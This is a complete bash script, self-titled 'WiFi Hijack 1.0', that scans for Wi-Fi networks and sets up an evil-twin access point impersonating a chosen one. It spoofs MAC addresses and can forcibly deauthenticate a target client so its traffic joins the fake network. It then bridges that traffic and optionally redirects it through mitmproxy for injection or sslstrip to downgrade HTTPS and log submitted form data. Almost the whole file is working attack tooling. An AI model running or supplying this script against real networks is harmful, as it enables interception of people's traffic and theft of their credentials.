#!/bin/bash

REAL_INT="eth0"
FAKE_INT="wlan0"
BRIDGE_INT="br0"

# Get command LINE attributes
POSITIONAL=()
while [[ $# -gt 0 ]]; do
  key="$1"
  case $key in
    -h|--help)
    echo "WiFi Hijack 1.0 by braindead"
    echo ""
    echo "Description:"
    echo "        Scans for wireless access points, then lets you choose one to impersonate. Requires two interfaces:"
    echo "        one to maintain an internet connection to pass through to the client, and one to host the evil twin."
    echo "        The first interface can connect to the same access point you intend to spoof with the second interface."
    echo "        Make sure the second interface is offline before running this script (ifconfig wlan0 down)."
    echo "        If the evil twin signal is stronger than the target access point, it will pick up clients automatically."
    echo "        If you want to target a particular client, use the --deauth flag to kick it off the target access point."
    echo ""
    echo "Required Package Dependencies:"
    echo "       macchanger"
    echo "       hostapd"
    echo "       dnsmasq"
    echo "       aircrack-ng"
    echo ""
    echo "Optional Tools:"
    echo "       wireshark"
    echo "       mitmproxy"
    echo "       sslstrip"
    echo ""
    echo "Usage: ./hijack.sh [options]"
    echo ""
    echo "Options:"
    echo "        -w, --wan <interface>               Interface name for the passthrough internet connection (default eth0)"
    echo "        -l, --lan <interface>               Interface name for the evil twin access point (default wlan0)"
    echo "        -b, --bridge <interface>            Interfacename for the bridge interface between wan and lan (default br0)"
    echo "        -s, --ssid <ssid>                   SSID of the target access point (will prompt if not specified)"
    echo "        -p, --passphrase <passphrase>       Passphrase for the target access point (will prompt if needed)"
    echo "        -m, --mac <mac>                     MAC address to assign to the evil twin (random if not specified)"
    echo "        -d, --deauth <mac>                  MAC address of a wireless client to deauthenticate"
    echo "        -r, --rescan <number>               0=Don't scan (use previous results), 1=Scan once (default), 2=Scan twice, 3=Scan thrice"
    echo "        --wireshark                         Launch wireshark and start capturing on the bridge interface"
    echo "        --mitmproxy                         Launch mitmproxy to monitor and inject HTTP traffic"
    echo "        --sslstrip                          Launch ssltrip to downgrade HTTPS to HTTP (when possible) and log POST requests"
    echo "        --cleanup                           Remove configuration files and shut down services (to recover after an interruption)"
    exit
    shift # past argument
    shift # past value
    ;;
    -w|--wan)
    REAL_INT="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--lan)
    FAKE_INT="$2"
    shift # past argument
    shift # past value
    ;;
    -b|--bridge)
    BRIDGE_INT="$2"
    shift # past argument
    shift # past value
    ;;
    -s|--ssid)
    SSID="$2"
    shift # past argument
    shift # past value
    ;;
    -m|--mac)
    FAKE_MAC="${2,,}"
    shift # past argument
    shift # past value
    ;;
    -p|--passphrase)
    PASS="$2"
    shift # past argument
    shift # past value
    ;;
    -d|--deauth)
    DEAUTH="$2"
    shift # past argument
    shift # past value
    ;;
    -r|--rescan)
    SCANS="$2"
    shift # past argument
    shift # past value
    ;;
    --wireshark)
    WIRE="1"
    shift # past argument
    ;;
    --mitmproxy)
    MITM="1"
    shift # past argument
    ;;
    --sslstrip)
    SSLSTRIP="1"
    shift # past argument
    ;;
    --cleanup)
    echo -n "Cleaning up previous connection..."
    killall -q dnsmasq
    killall -q hostapd
    iptables --flush
    iptables -t nat --flush
    ifconfig $FAKE_INT down
    echo "" >/var/lib/misc/dnsmasq.leases
    rm -f .dnsmasq
    rm -f .hostapd
    echo "done."
    exit
    ;;
    *)    # unknown option
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
  esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

# Validate input
if [ ! -z $SCANS ] && [[ $SCANS =~ ^[1|5-9]$ ]]; then
  $SCANS=""
fi

# Scan for access points
if [ -z $SCANS ] || [ $SCANS -gt 0 ]; then
  set -e
  echo "Scanning..."
  if [ ! -z "$FAKE_MAC" ]; then
    CURR_MAC="$(macchanger $FAKE_INT | head -n 1 | cut -d ' ' -f 5)" >/dev/null
    if [ "$FAKE_MAC" != "$CURR_MAC" ]; then
      macchanger -m $FAKE_MAC $FAKE_INT >/dev/null
    fi
  else
    macchanger -A $FAKE_INT >/dev/null
  fi
  ifconfig $FAKE_INT up
  if [ ! -z $SCANS ]; then
    while [ $SCANS -gt 1 ]; do
      iwlist $FAKE_INT scan >/dev/null
      (( SCANS-- ))
    done
  fi
  iwlist $FAKE_INT scan >.aps
  ifconfig $FAKE_INT down
fi

# Parse the results into an array
set +e
X=0
WPA2=0
if [ $(wc -c <.aps) -lt 1 ]; then
  echo "No history file found. Please scan again."
  exit
fi
while read LINE; do
  if [[ $LINE == *"Cell"* ]]; then
    (( X++ ))
    WPA2=0
    APS[$X]="$(echo $LINE | cut -d ' ' -f 5)"
  else
    if [[ $LINE == *"Channel:"* ]]; then
      APS[$X]="${APS[$X]}|$(echo $LINE | cut -d ':' -f 2)"
    elif [[ $LINE == *"ESSID:"* ]]; then
      APS[$X]="$(echo $LINE | cut -d ':' -f 2)|${APS[$X]}"
    elif [[ $LINE == *"Encryption key:"* ]]; then
      APS[$X]="${APS[$X]}|$(echo $LINE | cut -d ':' -f 2)"
    elif [[ $LINE == *"WPA2"* ]]; then
      APS[$X]="${APS[$X]}|WPA2"
      WPA2=1
    elif [[ $LINE == *"WPA"* ]] && [ $WPA2 -ne 1 ]; then
      APS[$X]="${APS[$X]}|WPA"
    elif [[ $LINE == *"WEP"* ]]; then
      APS[$X]="${APS[$X]}|WEP"
    fi
  fi
done <.aps

# If SSID was specified, find the AP
if [ ! -z "$SSID" ]; then
  X=0
  for EACH in "${APS[@]}"; do
    (( X++ ))
    APSSID="$(echo $EACH | cut -d '|' -f 1 | sed -e 's/^"//' -e 's/"$//')"
    if [ "$APSSID" == "$SSID" ]; then
      AP="${APS[$X]}"
      break
    fi
  done
  if [ -z "$AP" ]; then
    echo "The SSID was not found."
    exit
  fi

# Otherwise, build a menu
else
  X=0
  for EACH in "${APS[@]}"; do
    (( X++ ))
    SSID="$(echo $EACH | cut -d '|' -f 1 | sed -e 's/^"//' -e 's/"$//')"
    if [ -z "$SSID" ]; then
	  SSID="-hidden-"
    fi
    ENC="$(echo $EACH | cut -d '|' -f 5)"
    PSK="$(echo $EACH | cut -d '|' -f 4)"
    if [ "$PSK" == "on" ]; then
	  OPTION="$SSID ($ENC closed)"
    elif [ ! -z "$ENC" ]; then
	  OPTION="$SSID ($ENC open)"
    else
	  OPTION="$SSID (open)"
    fi
    OPTIONS[$X]=$OPTION
  done

  # Show the menu
  echo "Available access points:"
  PS3='Choose an access point to spoof: '
  select OPT in "${OPTIONS[@]}"; do
    if [ $REPLY -lt 1 ] || [ $REPLY -gt ${#OPTIONS[@]} ]; then
	  echo "Pull the other one."
    else
  	  AP="${APS[$REPLY]}"
  	  break
    fi
  done
  SSID="$(echo $AP | cut -d '|' -f 1 | sed -e 's/^"//' -e 's/"$//')"
fi

# Get the AP config details
MAC="$(echo $AP | cut -d '|' -f 2)"
CHANNEL="$(echo $AP | cut -d '|' -f 3)"
PSK="$(echo $AP | cut -d '|' -f 4)"
ENC="$(echo $AP | cut -d '|' -f 5)"

# Request a passphrase if necessary
while [ "$PSK" == "on" ] && [ -z "$PASS" ]; do
  echo -n "Enter passphrase: "
  read PASS
done

# Prepare DNSmasq config file
exec 3<> .dnsmasq
echo "interface=$BRIDGE_INT" >&3
echo "listen-address=10.1.1.1" >&3
echo "no-hosts" >&3
echo "dhcp-range=10.1.1.2,10.1.1.254,72h" >&3
echo "dhcp-option=option:router,10.1.1.1" >&3
echo "dhcp-authoritative" >&3
exec 3>&-

# Prepare HostAPD config file
if [ "$ENC" == "WEP" ]; then
echo "Can't generate HostAPD config - can only spoof WPA/WPA2."
  exit
fi

exec 3<> .hostapd
echo "interface=$FAKE_INT" >&3
echo "driver=nl80211" >&3
echo "hw_mode=g" >&3
echo "channel=$CHANNEL" >&3
echo "ssid=$SSID" >&3
echo "wpa_key_mgmt=WPA-PSK" >&3
echo "wpa_pairwise=TKIP CCMP" >&3
echo "bridge=$BRIDGE_INT" >&3
echo "macaddr_acl=0" >&3
echo "auth_algs=1" >&3
echo "ignore_broadcast_ssid=0" >&3
if [ "$ENC" == "WPA2" ]; then
  echo "wpa=2" >&3
elif [ "$ENC" == "WPA" ]; then
  echo "wpa=1" >&3
fi
if [ "$PSK" == "on" ]; then
  echo "wpa_passphrase=$PASS" >&3
fi
exec 3>&-

# Deauth a client
if [ ! -z "$DEAUTH" ]; then
  echo "Attempting to deauthenticate the target client..."
  airmon-ng start $FAKE_INT >/dev/null
  aireplay-ng --deauth 3 -a $MAC -c $DEAUTH ${FAKE_INT}mon
  sleep 2
  airmon-ng stop ${FAKE_INT}mon >/dev/null
fi

# Start the evil twin
echo "Starting services..."
set -e
if [ ! -z "$FAKE_MAC" ]; then
  CURR_MAC="$(macchanger $FAKE_INT | head -n 1 | cut -d ' ' -f 5)"
  if [ "$FAKE_MAC" != "$CURR_MAC" ]; then
    macchanger -m $FAKE_MAC $FAKE_INT >/dev/null
  fi
else
  macchanger -A $FAKE_INT >/dev/null
fi
FAKE_MAC="$(macchanger $FAKE_INT | head -n 1 | cut -d ' ' -f 5)"

hostapd -B .hostapd >/dev/null
ifconfig $FAKE_INT up
sleep 2
ifconfig $BRIDGE_INT up
ifconfig $BRIDGE_INT 10.1.1.1 netmask 255.255.255.0
SUBNET="$(route -n | grep $REAL_INT | grep -v ^0.0.0.0 | head -n 1 | cut -d ' ' -f 1)"
route add -net $SUBNET netmask 255.255.255.0 gw 10.1.1.1
iptables --flush
iptables -t nat --flush
iptables -t nat -A POSTROUTING -o $REAL_INT -j MASQUERADE
iptables -A FORWARD -i $BRIDGE_INT -o $REAL_INT -j ACCEPT
iptables -A FORWARD -i $REAL_INT -o $BRIDGE_INT -j ACCEPT
echo "" >/var/lib/misc/dnsmasq.leases
dnsmasq -C .dnsmasq

# Launch wireshark to monitor traffic on the bridge interface
if [ ! -z "$WIRE" ]; then
  echo "Starting wireshark..."
  gnome-terminal -x bash -c "wireshark -ki $BRIDGE_INT"
fi

# Launch mitmproxy to monitor and inject HTTP traffic
if [ ! -z "$MITM" ]; then
  echo "Starting mitmproxy..."
  iptables -t nat -A PREROUTING -i "$BRIDGE_INT" -p tcp --destination-port 80 -j REDIRECT --to-port 8080
  gnome-terminal -x bash -c "mitmproxy -T --host"
fi

# Launch sslstrip to downgrade HTTPS to HTTP when possible
if [ ! -z "$SSLSTRIP" ]; then
  echo "Starting sslstrip..."
  iptables -t nat -A PREROUTING -i "$BRIDGE_INT" -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  sslstrip -w sslstrip.log >/dev/null 2>&1 &
fi

# Prepare to shut down gracefully
trap ctrl_c INT
function ctrl_c(){
  echo ""
  echo -n "Stopping services..."
  if [ ! -z "$SSLSTRIP" ]; then
    killall -q sslstrip
  fi
  killall -q dnsmasq
  killall -q hostapd
  iptables --flush
  iptables -t nat --flush
  ifconfig $FAKE_INT down
  echo "" >/var/lib/misc/dnsmasq.leases
  rm -f .dnsmasq
  rm -f .hostapd
  echo "done."
  exit
}

# Keep running in the foreground
while true; do
  clear
  echo "Spoofing '$SSID' on $FAKE_MAC. Current DHCP leases:"
  echo ""
  cat /var/lib/misc/dnsmasq.leases
  if [ ! -z "$SSLSTRIP" ]; then
    echo ""
    echo "SSLSTRIP logs:"
    tail sslstrip.log
    echo ""
  fi
  echo ""
  echo "Press Ctrl-C to stop."
  sleep 1
done
